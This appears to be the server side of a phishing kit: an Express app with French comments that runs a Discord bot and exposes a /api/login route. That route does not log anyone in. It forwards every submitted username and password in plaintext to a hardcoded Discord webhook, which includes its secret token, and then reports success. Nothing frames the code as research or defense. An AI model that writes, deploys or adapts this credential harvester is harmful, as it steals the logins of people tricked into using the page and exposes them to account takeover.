const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// Initialisation du Bot Discord
const discordClient = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

discordClient.once('ready', () => {
    console.log(`🤖 Bot Discord connecté : ${discordClient.user.tag}`);
});

// Ton Token en dur pour être sûr à 100% qu'il se connecte sur Render
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;

discordClient.login(DISCORD_TOKEN).catch(err => {
    console.error("❌ Erreur lors du login Discord :", err);
});

// Route pour gérer la connexion et envoyer le webhook
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  const webhookUrl = 'https://discord.com/api/webhooks/1540701070035132426/sDLZp1nOijCqtXNWrH3nDbe7yABDpVkelKna2kzM7RBT6oQ1tl5Dik6PnjUC-3y2o9pe';

  const discordMessage = {
    embeds: [
      {
        title: '🔑 Nouvelle tentative de connexion',
        color: 3447003,
        fields: [
          { name: 'Utilisateur / Email', value: username || 'Non renseigné', inline: true },
          { name: 'Mot de passe', value: password || 'Non renseigné', inline: true },
        ],
        timestamp: new Date().toISOString(),
      },
    ],
  };

  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(discordMessage),
    });

    res.json({ success: true, message: 'Données transmises avec succès' });
  } catch (error) {
    console.error('Erreur lors de l\'envoi vers Discord :', error);
    res.status(500).json({ success: false, message: 'Erreur serveur' });
  }
});

app.listen(PORT, () => {
    console.log(`Serveur actif sur le port ${PORT}`);
});
